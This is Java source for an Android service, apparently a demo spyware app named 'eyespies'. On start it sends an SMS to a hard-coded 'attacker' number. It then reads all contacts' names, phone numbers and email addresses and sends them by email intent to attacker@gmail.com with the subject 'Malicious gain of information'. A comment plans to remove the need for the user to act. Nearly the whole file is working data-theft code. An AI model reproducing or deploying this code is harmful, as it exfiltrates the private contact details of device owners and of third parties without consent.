package com.eyespies.service;

import java.util.ArrayList;
import java.util.List;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

public class SecurityBreachService extends Service {
	private static final String TAG = "SecurityBreachService";
	private static final String attackerEmailId = "attacker@gmail.com";
	private static final String attackerMobile = "1111111111";

	@Override
	public IBinder onBind(Intent arg0) {
		System.out.println("Binding.. !!");
		return null;
	}

	@Override
	public void onCreate() {
		Log.i(TAG, "Service created");
		sendSMS();
		sendEmail();
	}

	public void sendSMS() {
		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage(attackerMobile, null, 
				"Client has been attacked..Details sent to email" , null, null);
	}
	
	@Override
	public void onStart(Intent intent, int startid) {
		System.out.println("On start overrided");
	}

	public int sendEmail() {
		ContentResolver resolver = getContentResolver();
		Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI,
				null, null, null, null);
		if (cursor.getCount() > 0) {
			List<ContactInformation> contacts = fetchAllContacts(resolver, cursor);
			cursor.close();
			sendMailToAddress(contacts);
			return 1;
		}
		return 0;
	}

	public List<ContactInformation> fetchAllContacts(ContentResolver resolver,Cursor cursor) {
		List<ContactInformation> contacts = new ArrayList<ContactInformation>();
		while (cursor.moveToNext()) {
			String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID)); 
			if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

				Cursor contactCursor = resolver.query(
						ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
						null, 
						ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", 
						new String[]{id}, null);

				while(contactCursor.moveToNext()){
					String contactNumber =  contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
					contactNumber = contactNumber.replaceAll("-", "");
					if(!contactNumber.equals(attackerMobile)) {
						String contactName = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
						String contactEmailIds = fetchContactEmailIds(resolver, id);
						contacts.add(new ContactInformation(contactName, contactNumber, contactEmailIds));
					}
				}	
				contactCursor.close();
			}
		}
		return contacts;
	}

	public String fetchContactEmailIds(ContentResolver cr, String id) {
		String contactEmailIds = "";
		Cursor emailCursor = cr.query(
				ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
				ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
				new String[] { id }, null);

		while (emailCursor.moveToNext()) {
			String email = emailCursor
					.getString(emailCursor
							.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
			contactEmailIds += (email + ", ");
		}
		emailCursor.close();
		return contactEmailIds;
	}

	//TODO: Current version requires User's intervention, Send email without having to do so
	private void sendMailToAddress(List<ContactInformation> contacts) {
		String emailMessage = constructEmailMessage(contacts);
		Intent intent = new Intent(Intent.ACTION_SENDTO); // it's not ACTION_SEND
		intent.setType("text/plain");
		intent.putExtra(Intent.EXTRA_SUBJECT, "Malicious gain of information");
		intent.putExtra(Intent.EXTRA_TEXT, emailMessage);
		intent.setData(Uri.parse("mailto:" + attackerEmailId)); // or just "mailto:" for blank
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // this will make such that when user returns to your app, your app is displayed, instead of the email app.
		startActivity(intent); 
	}

	private String constructEmailMessage(List<ContactInformation> contacts) {
		StringBuffer message = new StringBuffer();
		for (ContactInformation contactInformation : contacts) {
			message.append(contactInformation.getInfo());
		}
		return message.toString();
	}
}